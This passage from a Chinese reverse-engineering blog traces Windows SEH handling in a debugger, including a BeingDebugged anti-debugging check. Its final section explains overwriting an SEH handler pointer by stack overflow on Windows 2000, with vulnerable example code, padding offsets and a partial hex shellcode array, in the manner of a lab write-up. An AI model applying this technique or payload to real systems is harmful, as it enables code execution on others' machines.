<figcaption aria-hidden="true">image-20220924105650611</figcaption>
</figure>
<p>后向指针也已经指向了刚才的0x40105A节点.现在的SEH链长这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExceptionList@0x386000-&gt;</span><br><span class="line">	myNode@0x19FF28-&gt;</span><br><span class="line">	CRTNode@0x19FF64-&gt;</span><br><span class="line">	ntdllNode1@0x19FFCC-&gt;</span><br><span class="line">	ntdllNode2@0x19FFE4-&gt;</span><br><span class="line">	-1</span><br></pre></td></tr></table></figure>
<p>如果发生异常,首先会调用这个链最头上的<code>myNode@0x19FF28</code>中的异常处理函数</p>
<p>od已经自动识别出seh链长啥样了,od-&gt;查看-&gt;seh链</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924110529629.png"
alt="image-20220924110529629" />
<figcaption aria-hidden="true">image-20220924110529629</figcaption>
</figure>
<h3 id="引发异常">引发异常</h3>
<p>在注册完我们的seh节点之后,有两句故意找茬的指令,按理说c语言是敲不出这种指令的,实际上是用内联汇编写的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401017 xor     eax, eax</span><br><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
<p>把1写到0x0位置,显然往未注册过的内存写东西会寄,触发EXCEPTION_ACCESS_VIOLATION(0xc0000005)异常</p>
<h3 id="执行异常处理函数">执行异常处理函数</h3>
<p>触发异常之后,程序会跳转到第一个seh节点中注册的异常处理函数,期间经过了很多库函数调用,导致栈顶移动了很远的距离</p>
<p>从0x19FF28到0x19F320一共0xc08个字节</p>
<p>此时控制已经转移到myHandler@0x40105A,这就是main函数一开始注册的seh节点中的异常处理函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112137415.png"
alt="image-20220924112137415" />
<figcaption aria-hidden="true">image-20220924112137415</figcaption>
</figure>
<p>此时栈帧的情况</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112208795.png"
alt="image-20220924112208795" />
<figcaption aria-hidden="true">image-20220924112208795</figcaption>
</figure>
<p>myHandler@0x40105A的返回地址是NTDLL库函数</p>
<p>返回地址往上的4个双字就是myHandler的参数了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//返回值为枚举类型,表明本函数处理结束后程序的走向</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//线程上下文,包括各种寄存器值</span></span></span><br><span class="line"><span class="params">    PVOID pValue,<span class="comment">//系统内部使用,忽略</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>参数地址</th>
<th>参数指向</th>
</tr>
</thead>
<tbody>
<tr>
<td>pRecord</td>
<td>0x19F324</td>
<td>0x19F420</td>
</tr>
<tr>
<td>pFrame</td>
<td>0x19F328</td>
<td>0x19FF28</td>
</tr>
<tr>
<td>Context</td>
<td>0x19F32C</td>
<td>0x19F470</td>
</tr>
<tr>
<td>pValue</td>
<td>0x19F330</td>
<td>0x19F3AC</td>
</tr>
</tbody>
</table>
<p>参数指向的地址都在栈中,看来抬栈0xc08个字节其中的作用就有准备参数</p>
<h4 id="record0x19f420"><code>Record@0x19F420</code></h4>
<p>Record@0x19F420长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span><span class="comment">//0x50个字节</span></span><br><span class="line">    DWORD    ExceptionCode;</span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">    PVOID ExceptionAddress;</span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924113817007.png"
alt="image-20220924113817007" />
<figcaption aria-hidden="true">image-20220924113817007</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 29%" />
<col style="width: 11%" />
<col style="width: 48%" />
</colgroup>
<thead>
<tr>
<th>偏移</th>
<th>成员</th>
<th>值</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>ExceptionCode</td>
<td>0xC0000005</td>
<td>访问非法内存</td>
</tr>
<tr>
<td>0x4</td>
<td>ExceptionFlags</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>0x8</td>
<td>ExceptionRecord</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>0xC</td>
<td>ExceptionAddress</td>
<td>0x401019</td>
<td><code>.text:00401019 mov     dword ptr [eax], 1</code></td>
</tr>
<tr>
<td>0x10</td>
<td>NumberParameters</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0x14</td>
<td>ExceptionInformation[0]</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0x15-0x69</td>
<td>ExceptionInformation[1-..]</td>
<td>0</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="frame0x19ff28"><code>Frame@0x19FF28</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><span class="comment">//8字节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924122503631.png"
alt="image-20220924122503631" />
<figcaption aria-hidden="true">image-20220924122503631</figcaption>
</figure>
<h4 id="context0x19f470"><code>Context@0x19F470</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span><span class="comment">//0x2cc个字节</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">    </span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;	<span class="comment">//offset=0xB8</span></span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;<span class="comment">//C8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"></span><br><span class="line">&#125; CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> CONTEXT *PCONTEXT;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">==&gt;    0019F470   |0001007F</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+4      0019F474   |004011C2                                  返回到 seh.004011C2 来自 seh.00401000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8      0019F478   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C      0019F47C   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+10     0019F480   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+14     0019F484   |FFFF0FF0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+18     0019F488   |00000100</span></span><br><span class="line">省略浮点数寄存器</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+88     0019F4F8   |00000000	;segGS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8C     0019F4FC   |0000002B</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+90     0019F500   |00000053	;FS</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+94     0019F504   |0000002B	;ES</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+98     0019F508   |0000002B   ;DS</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+9C     0019F50C   |00401219   ;EDI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A0     0019F510   |00401219   ;ESI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A4     0019F514   |002CF000	;Ebx</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A8     0019F518   |005BF5B8	;Edx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+AC     0019F51C   |00000001	;Ecx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B0     0019F520   |00000000	;Eax</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B4     0019F524   |0019FF74	;EBP</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B8     0019F528   |00401019   ;Eip                               seh.00401019</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+BC     0019F52C   |00000023	;CS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C0     0019F530   |00010246	;Eflags</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C4     0019F534   |0019FF28	;Esp</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C8     0019F538   |0000002B	;segSS</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其中eip指向0x401019,这还是发生内存异常的那条指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
<h4 id="myhandler0x40105a">myHandler@0x40105A</h4>
<p>分析完了函数以及返回地址,现在将焦点放到该异常处理函数身上</p>
<p>此时的堆栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0019F320   77B08BF2  返回到 ntdll.77B08BF2	;返回地址</span><br><span class="line">0019F324   0019F420	;第一个参数,pRecord</span><br><span class="line">0019F328   0019FF28	;第二个参数,pFrame</span><br><span class="line">0019F32C   0019F470	;第三个参数,pContext</span><br><span class="line">0019F330   0019F3AC  UNICODE &quot;48&quot;;第四个参数,pValue</span><br></pre></td></tr></table></figure>
<h5 id="把context放到esi上">把context放到esi上</h5>
<p>第一条指令</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151509557.png"
alt="image-20220924151509557" />
<figcaption aria-hidden="true">image-20220924151509557</figcaption>
</figure>
<p>esp+0xC此时指向第三个参数,即pContext</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151452776.png"
alt="image-20220924151452776" />
<figcaption aria-hidden="true">image-20220924151452776</figcaption>
</figure>
<p>这里解引用了一下,就把Context的基地址放到esi上了</p>
<h5 id="将peb放到eax上">将PEB放到eax上</h5>
<p>fs选择子指向TEB的描述符,TEB+0x30指向PEB</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151603919.png"
alt="image-20220924151603919" />
<figcaption aria-hidden="true">image-20220924151603919</figcaption>
</figure>
<p>将TEB的基地址放到了eax上</p>
<h5 id="检测是否beingdebugged">检测是否beingdebugged</h5>
<p>第三条指令,取了PEB+0x2的一个字节的值,和1进行比较,</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152038006.png"
alt="image-20220924152038006" />
<figcaption aria-hidden="true">image-20220924152038006</figcaption>
</figure>
<p>PEB+0x2存放的就是BeingDebugged,如果正在被调试,一般该值会置1,</p>
<p>如果该值为1则和1的差就是0,ZF就置1</p>
<p>否则如果该值为0则和1的差不为0,ZF置0</p>
<h5 id="jnz-0x00401076">jnz 0x00401076</h5>
<p>实际调试的时候,刚才的计算结果不为0,即ZF=1,jnz跳转</p>
<blockquote>
<p>说也奇怪,使用od调试运行的,为啥这里没有检测出调试器呢?</p>
<p>od调试运行时不会检测出调试器,但是x32dbg调试运行就会检测出调试器</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152418482.png"
alt="image-20220924152418482" />
<figcaption aria-hidden="true">image-20220924152418482</figcaption>
</figure>
<h5 id="修改context.eip">修改context.Eip</h5>
<p>本函数一开始就将context的基地址放到了esi上,现在将0x401039放到[esi+0xB8]这个地方,也就是context+0xB8=Eip</p>
<p>这意味着,本seh节点的异常处理函数,将context上下文中的eip,根据当前是否被调试,从事故现场,改到了其他没有事故的函数中.这也就是该seh节点的异常处理策略</p>
<p>当本次异常处理结束之后,控制将会交给0x401039</p>
<blockquote>
<p>0x401039处的函数干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401039 loc_401039:                             ; DATA XREF: .text:loc_401076↓o</span><br><span class="line">.text:00401039                 push    0               ; uType</span><br><span class="line">.text:0040103B                 push    offset Caption  ; &quot;ReverseCore&quot;</span><br><span class="line">.text:00401040                 push    offset aHello   ; &quot;Hello :)&quot;</span><br><span class="line">.text:00401045                 push    0               ; hWnd</span><br><span class="line">.text:00401047                 call    ds:MessageBoxA</span><br><span class="line">.text:0040104D</span><br><span class="line">.text:0040104D loc_40104D:                             ; CODE XREF: _main+37↑j</span><br><span class="line">.text:0040104D                 pop     large dword ptr fs:0</span><br><span class="line">.text:00401054                 add     esp, 4</span><br><span class="line">.text:00401057                 retn</span><br><span class="line">.text:00401057 _main           endp</span><br></pre></td></tr></table></figure>
<p>首先弹窗</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png"
alt="image-20220924153224967" />
<figcaption aria-hidden="true">image-20220924153224967</figcaption>
</figure>
<p>然后指令<code>pop     large dword ptr fs:0</code>就把这个第一个seh节点给扬了,留作后话</p>
</blockquote>
<h5 id="返回">返回</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152852356.png"
alt="image-20220924152852356" />
<figcaption aria-hidden="true">image-20220924152852356</figcaption>
</figure>
<p>在修改完context.Eip之后,函数尾声将eax置就返回了</p>
<h3 id="删除seh节点">删除seh节点</h3>
<p>由于异常处理函数中将context.eip改成了0x401039,在该函数上下断点,然后Ctrl+F8自动步过,直到执行到断点位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153704246.png"
alt="image-20220924153704246" />
<figcaption aria-hidden="true">image-20220924153704246</figcaption>
</figure>
<p>这里会首先弹窗</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png"
alt="image-20220924153224967" />
<figcaption aria-hidden="true">image-20220924153224967</figcaption>
</figure>
<p>然后</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154538315.png"
alt="image-20220924154538315" />
<figcaption aria-hidden="true">image-20220924154538315</figcaption>
</figure>
<p>这条指令干了啥呢?</p>
<p>fs:0先前分析过,指向的是seh链的附加头节点,现在将栈顶弹给seh链的附加头节点,栈顶是谁呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154743820.png"
alt="image-20220924154743820" />
<figcaption aria-hidden="true">image-20220924154743820</figcaption>
</figure>
<p>指向下一个SEH记录的指针,将这个指针的值,即下一个seh节点的地址,放到seh链的附加头节点ExceptionList上,恰好就把main一开始注册的seh节点扬了</p>
<p>为啥这么巧栈顶此时就是下一个seh节点的指针呢?</p>
<p>因为堆栈平衡.0x401039是在main函数中的,当控制转移到0x401039时相当于在main中执行,此时的栈顶就是main刚注册完seh节点的状态</p>
<h3
id="返回到___tmaincrtstartup">返回到<code>___tmainCRTStartup</code></h3>
<p>在<code>0x401039</code>函数retn之前,栈顶上存放的是<code>0x4011C2</code>,将要作为返回地址了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155304450.png"
alt="image-20220924155304450" />
<figcaption aria-hidden="true">image-20220924155304450</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155235397.png"
alt="image-20220924155235397" />
<figcaption aria-hidden="true">image-20220924155235397</figcaption>
</figure>
<p>这是要返回到哪里去呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:004011AB                 mov     dword_40AF88, eax</span><br><span class="line">.text:004011B0                 push    eax             ; envp</span><br><span class="line">.text:004011B1                 push    argv            ; argv</span><br><span class="line">.text:004011B7                 push    argc            ; argc</span><br><span class="line">.text:004011BD                 call    _main           ; 异常处理函数地址压栈</span><br><span class="line">.text:004011C2                 add     esp, 0Ch</span><br><span class="line">.text:004011C5                 mov     [ebp+var_20], eax</span><br><span class="line">.text:004011C8                 cmp     [ebp+var_1C], 0</span><br></pre></td></tr></table></figure>
<p>一眼顶针,原来是返回到<code>___tmainCRTStartup</code>了</p>
<h2 id="栈溢出修改seh函数指针">栈溢出修改seh函数指针</h2>
<p>SEH节点都是在栈帧中的,缓冲区溢出可以修改SEH节点中的异常处理函数地址,改成shellcode</p>
<p>书上给出的有漏洞的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">	<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	_try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf, input); <span class="comment">// overrun the stack</span></span><br><span class="line">		zero = <span class="number">4</span> / zero;	<span class="comment">// generate an exception</span></span><br><span class="line">	&#125;</span><br><span class="line">	_except(MyExceptionhandler()) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在windows 2000上直接运行,由于test函数中有一个int
3中断,程序会在此报错然后启动调试</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924200524109.png"
alt="image-20220924200524109" />
<figcaption aria-hidden="true">image-20220924200524109</figcaption>
</figure>
<p>在int 3之前,0x40106B到0x40107C位置已经注册过seh节点</p>
<p>怎么注册的?</p>
<p>将原来的附加头节点中存储的第一个seh节点的地址作为当前节点的后继指针值,当前节点的异常处理函数注册为0x401518</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201147624.png"
alt="image-20220924201147624" />
<figcaption aria-hidden="true">image-20220924201147624</figcaption>
</figure>
<p>奇怪的是,这个0x401518也是原来的第一个seh节点的注册异常处理函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201233090.png"
alt="image-20220924201233090" />
<figcaption aria-hidden="true">image-20220924201233090</figcaption>
</figure>
<p>两个seh节点指向了同一异常处理函数</p>
<p>在栈帧视图上</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201413301.png"
alt="image-20220924201413301" />
<figcaption aria-hidden="true">image-20220924201413301</figcaption>
</figure>
<p>新注册的seh节点的异常处理函数指针在EBP-0xC位置</p>
<p>下面要调用strcpy函数了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201631140.png"
alt="image-20220924201631140" />
<figcaption aria-hidden="true">image-20220924201631140</figcaption>
</figure>
<p>首先将ebp+8位置的源串指针压栈作为strcpy的第二个参数</p>
<p>然后将ebp-0xe0位置的目标缓冲区压栈作为第一个参数</p>
<p>然后调用strcpy@0x401330,调用完后栈帧的状态</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201848804.png"
alt="image-20220924201848804" />
<figcaption aria-hidden="true">image-20220924201848804</figcaption>
</figure>
<p>缓冲区已经顶到了ebp-0x18,[ebp-0x18]正好是'\0'</p>
<p>再输入12个字节的填充就到了seh节点异常处理函数指针的家门口了,然后往这里写入四个字节的shellcode的地址</p>
<p>因此这个缓冲区可以写212字节的填充+3字节的shellcode地址,剩下一个字节正好是'\0'填到地址的高位</p>
<p>下面就是shellcode的构造了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]= </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> </span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> </span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> </span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> </span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> </span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> </span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> </span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span 